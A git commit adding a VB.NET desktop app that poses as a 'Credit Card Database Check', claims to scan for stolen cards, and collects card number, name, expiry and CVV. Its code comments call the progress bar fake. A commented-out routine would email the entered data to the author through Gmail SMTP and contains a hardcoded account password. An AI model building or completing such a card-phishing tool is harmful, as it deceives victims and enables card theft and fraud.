83e5a01f0d5666ac5da4af9a00ca1783dd43374b
BuildTools <unconfigured@null.spigotmc.org>
2020-07-27 15:47:38 -0400

    Add project files.

---
+++ Thing/Form1.Designer.vb
@@ -0,0 +1,238 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()>
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()>
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Me.Label1 = New System.Windows.Forms.Label()
+        Me.Label2 = New System.Windows.Forms.Label()
+        Me.Label3 = New System.Windows.Forms.Label()
+        Me.Label4 = New System.Windows.Forms.Label()
+        Me.btnCheck = New System.Windows.Forms.Button()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.labelComplete = New System.Windows.Forms.Label()
+        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar()
+        Me.txtHeader = New System.Windows.Forms.TextBox()
+        Me.txtSend = New System.Windows.Forms.TextBox()
+        Me.Timer2 = New System.Windows.Forms.Timer(Me.components)
+        Me.Label5 = New System.Windows.Forms.Label()
+        Me.Timer3 = New System.Windows.Forms.Timer(Me.components)
+        Me.Label7 = New System.Windows.Forms.Label()
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.TextBox2 = New System.Windows.Forms.TextBox()
+        Me.txtmessage = New System.Windows.Forms.Label()
+        Me.SuspendLayout()
+        '
+        'Label1
+        '
+        Me.Label1.AutoSize = True
+        Me.Label1.Font = New System.Drawing.Font("Microsoft Sans Serif", 27.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Label1.ForeColor = System.Drawing.Color.Red
+        Me.Label1.Location = New System.Drawing.Point(-1, -2)
+        Me.Label1.Name = "Label1"
+        Me.Label1.Size = New System.Drawing.Size(577, 42)
+        Me.Label1.TabIndex = 5
+        Me.Label1.Text = "Has your credit card been stolen?"
+        '
+        'Label2
+        '
+        Me.Label2.AutoSize = True
+        Me.Label2.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Label2.Location = New System.Drawing.Point(12, 122)
+        Me.Label2.Name = "Label2"
+        Me.Label2.Size = New System.Drawing.Size(70, 13)
+        Me.Label2.TabIndex = 6
+        Me.Label2.Text = "Card number:"
+        '
+        'Label3
+        '
+        Me.Label3.AutoSize = True
+        Me.Label3.Location = New System.Drawing.Point(5, 148)
+        Me.Label3.Name = "Label3"
+        Me.Label3.Size = New System.Drawing.Size(77, 13)
+        Me.Label3.TabIndex = 7
+        Me.Label3.Text = "Name on card:"
+        '
+        'Label4
+        '
+        Me.Label4.AutoSize = True
+        Me.Label4.Location = New System.Drawing.Point(20, 174)
+        Me.Label4.Name = "Label4"
+        Me.Label4.Size = New System.Drawing.Size(62, 13)
+        Me.Label4.TabIndex = 8
+        Me.Label4.Text = "Expiry date:"
+        '
+        'btnCheck
+        '
+        Me.btnCheck.FlatStyle = System.Windows.Forms.FlatStyle.System
+        Me.btnCheck.Location = New System.Drawing.Point(464, 200)
+        Me.btnCheck.Name = "btnCheck"
+        Me.btnCheck.Size = New System.Drawing.Size(95, 23)
+        Me.btnCheck.TabIndex = 10
+        Me.btnCheck.Text = "Scan database"
+        Me.btnCheck.UseVisualStyleBackColor = True
+        '
+        'Timer1
+        '
+        Me.Timer1.Interval = 1
+        '
+        'labelComplete
+        '
+        Me.labelComplete.AutoSize = True
+        Me.labelComplete.BackColor = System.Drawing.Color.Transparent
+        Me.labelComplete.ForeColor = System.Drawing.SystemColors.ControlText
+        Me.labelComplete.Location = New System.Drawing.Point(475, 105)
+        Me.labelComplete.Name = "labelComplete"
+        Me.labelComplete.RightToLeft = System.Windows.Forms.RightToLeft.No
+        Me.labelComplete.Size = New System.Drawing.Size(19, 13)
+        Me.labelComplete.TabIndex = 12
+        Me.labelComplete.Text = "    "
+        Me.labelComplete.TextAlign = System.Drawing.ContentAlignment.MiddleRight
+        '
+        'ProgressBar1
+        '
+        Me.ProgressBar1.BackColor = System.Drawing.SystemColors.Control
+        Me.ProgressBar1.Cursor = System.Windows.Forms.Cursors.Default
+        Me.ProgressBar1.ForeColor = System.Drawing.SystemColors.MenuHighlight
+        Me.ProgressBar1.Location = New System.Drawing.Point(12, 73)
+        Me.ProgressBar1.MarqueeAnimationSpeed = 10
+        Me.ProgressBar1.Maximum = 1000
+        Me.ProgressBar1.Name = "ProgressBar1"
+        Me.ProgressBar1.RightToLeft = System.Windows.Forms.RightToLeft.No
+        Me.ProgressBar1.Size = New System.Drawing.Size(547, 23)
+        Me.ProgressBar1.Step = 1
+        Me.ProgressBar1.Style = System.Windows.Forms.ProgressBarStyle.Continuous
+        Me.ProgressBar1.TabIndex = 11
+        '
+        'txtHeader
+        '
+        Me.txtHeader.ForeColor = System.Drawing.Color.Black
+        Me.txtHeader.Location = New System.Drawing.Point(88, 145)
+        Me.txtHeader.MaxLength = 16
+        Me.txtHeader.Name = "txtHeader"
+        Me.txtHeader.Size = New System.Drawing.Size(161, 20)
+        Me.txtHeader.TabIndex = 2
+        Me.txtHeader.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'txtSend
+        '
+        Me.txtSend.ForeColor = System.Drawing.Color.Gray
+        Me.txtSend.Location = New System.Drawing.Point(88, 119)
+        Me.txtSend.Name = "txtSend"
+        Me.txtSend.Size = New System.Drawing.Size(181, 20)
+        Me.txtSend.TabIndex = 13
+        Me.txtSend.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'Timer2
+        '
+        Me.Timer2.Interval = 1000
+        '
+        'Label5
+        '
+        Me.Label5.AutoSize = True
+        Me.Label5.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.Label5.Location = New System.Drawing.Point(2, 40)
+        Me.Label5.Name = "Label5"
+        Me.Label5.Size = New System.Drawing.Size(498, 20)
+        Me.Label5.TabIndex = 16
+        Me.Label5.Text = "Check if your credentials have been compromised using our database"
+        '
+        'Timer3
+        '
+        Me.Timer3.Interval = 1000
+        '
+        'Label7
+        '
+        Me.Label7.AutoSize = True
+        Me.Label7.Location = New System.Drawing.Point(51, 200)
+        Me.Label7.Name = "Label7"
+        Me.Label7.Size = New System.Drawing.Size(31, 13)
+        Me.Label7.TabIndex = 17
+        Me.Label7.Text = "CVV:"
+        '
+        'TextBox1
+        '
+        Me.TextBox1.Location = New System.Drawing.Point(88, 197)
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(39, 20)
+        Me.TextBox1.TabIndex = 20
+        '
+        'TextBox2
+        '
+        Me.TextBox2.Location = New System.Drawing.Point(88, 171)
+        Me.TextBox2.Name = "TextBox2"
+        Me.TextBox2.Size = New System.Drawing.Size(51, 20)
+        Me.TextBox2.TabIndex = 21
+        '
+        'txtmessage
+        '
+        Me.txtmessage.AutoSize = True
+        Me.txtmessage.Location = New System.Drawing.Point(434, 78)
+        Me.txtmessage.Name = "txtmessage"
+        Me.txtmessage.Size = New System.Drawing.Size(0, 13)
+        Me.txtmessage.TabIndex = 22
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackColor = System.Drawing.Color.White
+        Me.ClientSize = New System.Drawing.Size(571, 234)
+        Me.Controls.Add(Me.txtmessage)
+        Me.Controls.Add(Me.TextBox2)
+        Me.Controls.Add(Me.TextBox1)
+        Me.Controls.Add(Me.Label7)
+        Me.Controls.Add(Me.Label5)
+        Me.Controls.Add(Me.labelComplete)
+        Me.Controls.Add(Me.txtSend)
+        Me.Controls.Add(Me.btnCheck)
+        Me.Controls.Add(Me.txtHeader)
+        Me.Controls.Add(Me.ProgressBar1)
+        Me.Controls.Add(Me.Label4)
+        Me.Controls.Add(Me.Label3)
+        Me.Controls.Add(Me.Label2)
+        Me.Controls.Add(Me.Label1)
+        Me.ForeColor = System.Drawing.SystemColors.ControlText
+        Me.Name = "Form1"
+        Me.Text = "Credit Card Database Check"
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+    Friend WithEvents Label1 As Label
+    Friend WithEvents Label2 As Label
+    Friend WithEvents Label3 As Label
+    Friend WithEvents Label4 As Label
+    Friend WithEvents btnCheck As Button
+    Friend WithEvents Timer1 As Timer
+    Friend WithEvents labelComplete As Label
+    Private WithEvents ProgressBar1 As ProgressBar
+    Friend WithEvents txtHeader As TextBox
+    Friend WithEvents txtSend As TextBox
+    Friend WithEvents Timer2 As Timer
+    Friend WithEvents Label5 As Label
+    Friend WithEvents Timer3 As Timer
+    Friend WithEvents Label7 As Label
+    Friend WithEvents TextBox1 As TextBox
+    Friend WithEvents TextBox2 As TextBox
+    Friend WithEvents txtmessage As Label
+End Class
---
+++ Thing/Form1.vb
@@ -0,0 +1,71 @@
+﻿'CODE CONVENTIONS " SUB PROCEDURE (BYval EFUWEHJ aS iNTEGER){{{{{}}}}}}
+Imports System.Net.Mail
+Public Class Form1
+    Dim header As String
+    Dim message As String
+
+    'Email sending sub didn't work because school blocks sending of emails
+
+    Public Sub EmailSend(smtpServer As Object) '(Dim smtpServer As New SmtpClient)
+        'Dim mail As New MailMessage()
+        'smtpServer.Credentials = New Net.NetworkCredential("throwawaybabyxd@gmail.com", "Throwback123")
+        'smtpServer.Port = 587
+        'smtpServer.Host = "smtp.gmail.com"
+        'smtpServer.EnableSsl = True
+        'mail = New MailMessage()
+        'mail.From = New MailAddress("throwawaybabyxd@gmail.com", "IDK")
+        'mail.To.Add("REDACTED")
+        'mail.Subject = "Info"
+        'mail.Body = txtHeader.Text & txtmessage.Text
+        'smtpServer.Send(mail)
+    End Sub
+
+    Private Sub Check_Click(sender As Object, e As EventArgs) Handles btnCheck.Click
+        'Call EmailSend(Dim smtpServer As New SmtpClient()
+        Me.txtHeader.Text = header
+        Me.txtMessage.Text = message
+        Timer1.Enabled = True
+    End Sub
+
+    Private Sub TextBox4_Click(sender As Object, e As EventArgs)
+        Me.txtMessage.Text = Nothing
+        Me.txtMessage.ForeColor = Color.Black
+    End Sub
+    'This timer smoothly animates the fake progress bar
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        If ProgressBar1.Value < 1000 Then
+
+            ProgressBar1.Value = ProgressBar1.Value + 10
+            labelComplete.Visible = True
+            labelComplete.Text = ProgressBar1.Value / 10 & "% Completed"
+
+            If ProgressBar1.Value >= 1000 Then
+                labelComplete.Visible = False
+                Timer2.Enabled = True
+            End If
+        End If
+    End Sub
+
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        labelComplete.Text = "Completed"
+        Timer1.Enabled = False
+        labelComplete.Location = New Point(500, 105)
+        If labelComplete.Visible = False Then
+            Timer3.Enabled = True
+            Timer2.Enabled = False
+        End If
+    End Sub
+
+    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
+        If labelComplete.Visible = False Then
+            labelComplete.Visible = True
+        Else
+            labelComplete.Visible = False
+        End If
+    End Sub
+
+    Private Sub Label1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Label1.MouseDoubleClick
+        Application.Exit()
+    End Sub
+
+End Class
